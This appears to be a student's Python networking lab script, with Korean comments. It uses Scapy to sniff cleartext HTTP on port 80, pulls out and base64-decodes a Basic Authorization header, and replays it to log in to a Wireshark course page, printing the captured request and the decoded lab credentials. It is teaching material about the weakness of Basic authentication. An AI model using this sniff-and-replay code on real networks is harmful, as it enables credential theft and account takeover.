""" 
HTTP Protocol
1. HTTP Get
2. HTTP Authentication/Header
3. Sniff
4. Scapy Library
5. Base 64 encoding/decoding

=============================
1. User 가 login_url 에 로그인
2. 로그인에는 user name 과 password 가 필요
3. HTTP protocol 의 basic authentication (base 64 encoding)
    3-1. 이때, 교재의 authentication 과는 다르게 user name 도 encoding 된다. 즉, attacker 가 로그인을 할 때에는 username:password > encoding 되어 있는 형태로 보내야한다.
4. Attacker 는 user 가 로그인을 시도할 때, sniffing 을 통해 정보 가져오기
5. Packet 에 담겨져 있는 user name 과 password 를 이용해 login_url 에 로그인 

=============================
추가 질문.
1. decoding 된 user name 과 password
2. HTTP protocol version
3. Host name 
=============================
최종적으로 필요한 것들, (code + image)

1. decoded user info
2. HTTP protocol version
3. Host name
4. response.status_code == 200 by attacker

"""


import login
from login import login_url
import base64
import requests
from scapy.all import*

class User():
  
    def access(self):      
        login.user_login()
        
class Attacker():
    
    def __init__(self):
        
        self.encoded_info = None
        self.decoded_info = None
        
        self.http_version = None
        self.host_name = None
        
        self.packet_captured = False
    
    def sniff_http_traffic(self):
        def packet_callback(packet):
            if not self.packet_captured and packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8')
                if 'GET' in load:
                    print("HTTP GET 요청을 찾았습니다:")
                    print(load)
                    self.encoded_info = load.split('Basic ')[1].strip()
                    print("인코딩된 사용자 인증 정보:", self.encoded_info)
                    
                    # 추출한 값을 Base64 디코딩하여 사용자 인증 정보 얻기
                    self.decoded_info = base64.b64decode(self.encoded_info).decode('utf-8')
                    print("디코딩된 사용자 인증 정보:", self.decoded_info)
                    
                    self.packet_captured = True

        print("HTTP 요청 캡처를 시작합니다...")
        sniff(filter="tcp port 80", prn=packet_callback, store=0)
        
    def attack(self):
        print("Attack Start...!")
        headers = {'Authorization': f'Basic {self.encoded_info}'}
        print(headers)

        # 로그인 요청 보내기
        response = requests.get(login_url, headers=headers)

        # 응답 확인
        if response.status_code == 200:
            print('Attacker 로그인 성공!')
        else:
            print('Attacker 로그인 실패...')


if __name__ == '__main__':
    # User 및 attacker 선언
    user = User()
    attacker = Attacker()
    
    # HTTP 트래픽 캡처 및 user 의 login -> user info 가져오기
    capture_thread = threading.Thread(target=attacker.sniff_http_traffic)
    capture_thread.start()
    
    user.access()
    
    # User info 를 토대로, login
    attacker.attack()
    
    print("username:password: ",attacker.decoded_info)
    print("HTTP protocol version: ",attacker.http_version)
    print("Host name: ",attacker.host_name)
    
"""
print(load):

GET /wireshark-labs/protected_pages/HTTP-wireshark-file5.html HTTP/1.1
Host: gaia.cs.umass.edu
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Authorization: Basic d2lyZXNoYXJrLXN0dWRlbnRzOm5ldHdvcms=


인코딩된 사용자 인증 정보: d2lyZXNoYXJrLXN0dWRlbnRzOm5ldHdvcms=
디코딩된 사용자 인증 정보: wireshark-students:network

"""
